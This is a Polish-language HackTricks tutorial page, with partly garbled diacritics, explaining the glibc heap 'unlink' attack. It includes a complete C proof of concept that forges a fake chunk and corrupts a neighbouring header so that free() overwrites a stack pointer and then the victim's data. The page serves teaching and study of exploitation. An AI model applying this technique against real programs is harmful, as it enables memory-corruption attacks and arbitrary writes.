# Atak Unlink

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

Kiedy ten atak zosta odkryty, g贸wnie pozwala na WWW (Write What Where), jednak dodano **sprawdzenia**, co sprawio, 偶e nowa wersja ataku staa si bardziej interesujca, ale r贸wnie偶 bardziej zo偶ona i **bezu偶yteczna**.

### Przykad kodu:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

### Cel

* Zmodyfikuj wska藕nik do fragmentu na stosie, aby wskazywa na stos, dziki czemu mo偶liwe bdzie zmienianie zawartoci stosu poprzez zapisywanie w fragmencie

### Wymagania

* Pewna kontrola w pamici (np. stosie), aby utworzy kilka fragment贸w, nadajc wartoci niekt贸rym atrybutom.
* Wyciek stosu w celu ustawienia wska藕nik贸w faszywego fragmentu.

### Atak

* Istniej dwa fragmenty (fragment1 i fragment2)
* Atakujcy kontroluje zawarto fragmentu1 oraz nag贸wki fragmentu2.
* W fragmencie1 atakujcy tworzy struktur faszywego fragmentu:
* Aby omin zabezpieczenia, upewnia si, 偶e pole `size` jest poprawne, aby unikn bdu: `corrupted size vs. prev_size while consolidating`
* oraz pola `fd` i `bk` faszywego fragmentu wskazuj na miejsce, gdzie przechowywany jest wska藕nik fragmentu1 z przesuniciami odpowiednio -3 i -2, wic `fake_chunk->fd->bk` i `fake_chunk->bk->fd` wskazuj na pozycj w pamici (stosie), gdzie znajduje si rzeczywisty adres fragmentu1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Nag贸wki fragmentu2 s modyfikowane w taki spos贸b, aby wskazyway, 偶e poprzedni fragment nie jest u偶ywany, a rozmiar to rozmiar zawartego faszywego fragmentu.
* Gdy drugi fragment zostanie zwolniony, to ten faszywy fragment zostanie odczony:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Wczeniej sprawiono, 偶e `fake_chunk->fd->bk` i `fake_chunk->fd->bk` wskazuj na to samo miejsce (miejsce na stosie, gdzie przechowywany jest `fragment1`), wic byo to poprawne poczenie listy. Poniewa偶 **oba wskazuj na to samo miejsce**, tylko ostatnie (`fake_chunk->bk->fd = fake_chunk->fd`) bdzie miao **skutek**.
* Spowoduje to **nadpisanie wska藕nika do fragmentu1 na stosie adresem (lub bajtami) przechowywanym 3 adresy wczeniej na stosie**.
* Dlatego jeli atakujcy m贸gby ponownie kontrolowa zawarto fragmentu1, bdzie m贸g **pisa wewntrz stosu**, potencjalnie nadpisa adres powrotu pomijajc canary oraz modyfikowa wartoci i wska藕niki zmiennych lokalnych. Nawet ponownie modyfikujc adres fragmentu1 przechowywany na stosie na inne miejsce, jeli atakujcy m贸gby ponownie kontrolowa zawarto fragmentu1, bdzie m贸g pisa w dowolnym miejscu.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Referencje

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
